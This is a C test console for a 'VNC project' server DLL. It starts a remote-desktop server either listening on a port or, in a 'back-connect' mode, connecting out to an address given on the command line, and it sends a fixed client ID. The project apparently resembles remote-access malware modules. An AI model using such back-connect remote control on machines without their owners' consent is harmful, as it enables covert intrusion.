//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: testvnc.h
// $Revision: 154 $
// $Date: 2014-02-07 15:56:24 +0400 (Пт, 07 фев 2014) $
// description:
//	VNC-server testing application.

#include "..\inc\main.h"
#include <conio.h>
#include <stdio.h>

typedef ULONG	(__stdcall* FUNC_StartServer)	(PVOID* pServerHandle, SOCKADDR_IN*	ServerAddress, LPTSTR pClientId, BOOL bWaitConnect);
typedef	VOID	(__stdcall* FUNC_StopServer)	(PVOID	ServerHandle);


#define	szServerStartFunction		"VncStartServer"
#define	szServerStopFunction		"VncStopServer"

#ifdef _WIN64
	#define	tczServerDllName		_T("vncdll64.dll")
#else
	#define	tczServerDllName		_T("vncdll.dll")
#endif

#define	DEFAULT_SERVER_PORT			5900
#define	DEFAULT_CLIEN_ID			"222289DD-9234-C9CA-94E3-E60D08C77777"


//
//	Converts the specified address string of an IP:PORT format into two integers specifying IP-address and TCP-port values.
//
BOOL	AddressToInt(
	LPTSTR	pIpStr,		// address string
	PULONG	pAddress,	// variable that receives IP-address value
	PUSHORT	pTcpPort	// variable that receives TCP-port value
	)
{
	BOOL	Ret = FALSE;
	PCHAR	pStr, pPort;
	struct hostent* pHostEnt;

	WSADATA		WsaData;

	if (!WSAStartup(0x0201, &WsaData))
	{
		if (pStr = malloc((_tcslen(pIpStr) + 1) * sizeof(_TCHAR)))
		{
	#ifdef _UNICODE
			wcstombs(pStr, pIpStr, _tcslen(pIpStr) + 1);
	#else
			_tcscpy(pStr, pIpStr);
	#endif

			if (!(pPort = strchr(pStr, ':')))
				pPort = pStr;
			else
			{		
				*pPort = 0;
				pPort += 1;
			}

			*pTcpPort = (USHORT)strtoul(pPort, 0, 0);

			if (!(pPort == pStr))
			{
				if (pHostEnt = gethostbyname(pStr))
				{
					*pAddress = *(PULONG)(*pHostEnt->h_addr_list);
					Ret = TRUE;
				}
			}
			else
			{
				*pAddress = 0;
				if (*pTcpPort)
					Ret = TRUE;
			}
			free(pStr);
		}

		WSACleanup();
	}

	return(Ret);
}


//
//	Our application main function.
//	This is a console application that can be started with the following command line:
//		[IP_ADDR:]PORT
//	where IP_ADDR is an optional parameter that specifies the IP-address of a back-connect server (if needed).
//	If no IP_ADDR specified, the server is being started in incomming connection mode and will wait on the specified PORT.
//	If no PORT specified, the server will wait on the default port.
//

int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE	hModule;
	ULONG	IpAddress = 0;
	USHORT	Port = DEFAULT_SERVER_PORT;

	if (hModule = LoadLibrary(tczServerDllName))
	{
		FUNC_StartServer pStartServer = (FUNC_StartServer)GetProcAddress(hModule, szServerStartFunction);
		FUNC_StopServer pStopServer = (FUNC_StopServer)GetProcAddress(hModule, szServerStopFunction);

		if ((pStartServer) && (pStopServer))
		{
			if ((argc == 1) || AddressToInt(argv[1], &IpAddress, &Port))
			{
				SOCKADDR_IN	Addr = {0};
				PVOID	hServer;

				Addr.sin_family = AF_INET;
				Addr.sin_port = htons(Port);
				Addr.sin_addr.S_un.S_addr = IpAddress;

				if (((pStartServer)(&hServer, &Addr, DEFAULT_CLIEN_ID, TRUE)) == NO_ERROR)
				{
					printf("VNC server started locally in ");
					if (Addr.sin_addr.S_un.S_addr)
						printf("BC-mode. Connect it at %u.%u.%u.%u:%u\n", Addr.sin_addr.S_un.S_un_b.s_b1, Addr.sin_addr.S_un.S_un_b.s_b2, Addr.sin_addr.S_un.S_un_b.s_b3, Addr.sin_addr.S_un.S_un_b.s_b4, htons(Addr.sin_port));
					else
						printf("IC-mode on port %u\n", htons(Addr.sin_port));

					printf("Press any key to stop the server...\n");
					do 
					{
						Sleep(200);
					} while(!getch());

					pStopServer(hServer);
				}	// if (((pStartServer)(&hServer, &Addr)) == NO_ERROR)
				else
				{
					printf("VNC server failed to start. Please verify connection parameters.\n");
				}
			}	// if ((argc == 1) && AddressToInt(argv[1], &IpAddress, &Port))
			else
				printf("Invalid parameter. Please specify IP:PORT for the BC-mode or just PORT for the IC-mode.\n");
		}	// if ((pStartServer) && (pStopServer))

		FreeLibrary(hModule);
	}	// if (hModule = LoadLibrary(tczServerDllName))
	else
		printf("Unable to load %s, error %u\n", tczServerDllName, GetLastError());

	return 0;
}

